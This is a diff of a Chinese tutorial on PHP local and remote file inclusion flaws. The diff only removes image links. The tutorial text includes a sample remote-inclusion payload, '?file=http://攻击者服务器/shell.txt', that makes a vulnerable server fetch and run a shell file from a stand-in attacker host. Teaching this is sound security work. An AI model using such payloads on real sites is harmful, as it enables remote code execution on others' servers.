@@ -21,7 +21,6 @@
 
 在这段代码中，`file` 参数通过 `GET` 方式从URL中获取，并直接传递给 `include` 函数。如果攻击者在URL中构造 `?file=恶意文件路径`，服务器就会包含并执行该文件。
 
-![](img/4791cbbf04c2606ce2c9d7d6bb688f32_3.png)
 
 ![](img/4791cbbf04c2606ce2c9d7d6bb688f32_5.png)
 
@@ -41,9 +40,7 @@ PHP中常见的文件包含函数有四个：
 
 ### 📁 本地文件包含
 
-![](img/4791cbbf04c2606ce2c9d7d6bb688f32_7.png)
 
-![](img/4791cbbf04c2606ce2c9d7d6bb688f32_8.png)
 
 本地文件包含是指被包含的文件位于服务器本地。攻击者可以利用此漏洞包含服务器上的敏感文件或自己上传的恶意文件。
 
@@ -72,7 +69,6 @@ RFI漏洞的利用需要满足两个PHP配置条件（在 `php.ini` 中）：
 1.  `allow_url_fopen = On`
 2.  `allow_url_include = On` (在PHP 5.2之后默认关闭，因此RFI较难利用)
 
-![](img/4791cbbf04c2606ce2c9d7d6bb688f32_10.png)
 
 利用方式示例：
 攻击者可以在自己的服务器上放置一个包含PHP代码的文本文件（如 `http://攻击者服务器/shell.txt`），然后通过存在RFI漏洞的参数去包含它：`?file=http://攻击者服务器/shell.txt`。
